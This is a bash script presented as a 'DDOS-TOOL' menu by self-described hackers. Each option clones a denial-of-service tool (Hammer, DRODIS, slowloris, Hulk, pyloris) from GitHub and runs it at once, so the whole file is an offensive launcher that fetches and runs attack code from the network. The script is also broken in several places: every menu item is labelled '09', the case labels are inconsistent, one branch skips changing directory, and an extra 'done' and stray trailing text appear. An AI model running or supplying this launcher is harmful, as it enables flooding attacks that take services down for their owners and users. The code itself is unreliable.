#!/bin/bash
# version 1.0

clear


echo ""
echo -e "SUBSCRIBE TO MY CHANNEL"
echo ""

echo -e "\e[1;42m Press Enter on your keyboard\e[0m"
read a1

echo "Loading..." |
sleep 2
clear

toilet -f future "DDOS-TOOL"
echo "-------------------------------------------------------"
echo   "Author   : AnonyminHack5, Sourabh Mishra $white"
echo   "Contact  : https://facebook.com/anonyminHack5 $white"
echo   "YouTube  : GAMER LINKS $white"
echo   "Blog     : https://termuxhack.simdif.com and http://www.sourabh.42web.io/ $white"
echo "-------------------------------------------------------"
echo "                           v2.0              " |
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo  "Detected, Trying To Exit 🚪 ... "
echo ""
echo  "⚠️THIS DDOS TOOL IS NOT FOR ILLEGEL USE⚠️"
sleep 1
echo ""
echo "AnonyminHack5 AND Sourabh Mishra " 
echo ""
echo "BYE BYE 👋👋..." 
echo ""
echo "COME BACK SOON HACKERS" 
sleep 1
exit
}

lagi=01
while [ $lagi -lt 5 ];
do
echo ""
echo -e "\e[1;101m\e[1;97m09\e[1;101m\e[0m\e[1;96m HAMMER\e[0m\n";
echo -e "\e[1;101m\e[1;97m09\e[1;101m\e[0m\e[1;96m DRODIS\e[0m\n";
echo -e "\e[1;101m\e[1;97m09\e[1;101m\e[0m\e[1;96m SLOWLORIS\e[0m\n";
echo -e "\e[1;101m\e[1;97m09\e[1;101m\e[0m\e[1;96m HULK\e[0m\n";
echo -e "\e[1;101m\e[1;97m09\e[1;101m\e[0m\e[1;96m PYLORIS\e[0m\n";
echo -e "\e[1;34m EXIT\e[0m\n";
echo ""
echo  "╭─SELECT DDOS TOOL TO INSTALL"
read -p "╰──►" pil;


#HAMMER


case $pil in
01) clear
toilet -f standard " DDOS-TOOL " -F gay
git clone https://github.com/TermuxHackz/Hammer
cd Hammer
python hammer.py
 

;;


#DRODIS


02) clear
toilet -f standard " DDOS-TOOL " -F gay
git clone https://github.com/TermuxHackz/DRODIS
cd DRODIS
chmod +x exploit.py
python exploit.py 


;;


#SLOWLORIS


3) clear
toilet -f standard " DDOS-TOOL " -F gay
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py


;;


#HULK


04) clear
toilet -f standard " DDOS-TOOL " -F gay
git clone https://github.com/Mr4FX/Hulk-ddos-attack
chmod +x hulk.py
python hulk.py


;;


#PYLORIS


05) clear
toilet -f standard " DDOS-TOOL " -F gay
git clone https://github.com/TermuxHackz/pyloris
cd pyloris
python attack.py


;;


00) echo "Bye, this tool was created by : ANONYMINHACK5 and Sourabh Mishra"
exit


;;


*) echo "sorry, the  option you looking is not found"
esac
done
done

=================="
